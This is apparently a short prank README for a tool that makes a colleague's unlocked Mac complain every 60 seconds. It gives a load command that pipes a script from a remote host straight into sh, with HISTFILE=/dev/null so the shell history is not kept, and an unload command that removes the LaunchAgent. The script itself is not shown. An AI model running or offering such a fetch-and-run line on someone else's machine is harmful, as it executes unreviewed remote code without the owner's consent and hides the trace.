Your colleague is leaving their mac unlocked?

Make the computer complain every 60 seconds!

# Load

```
$ HISTFILE=/dev/null curl -L http://please.lock.me.uk | sh
```

# Unload

```
$ launchctl unload ~/Library/LaunchAgents/lock.me.uk.plist
```

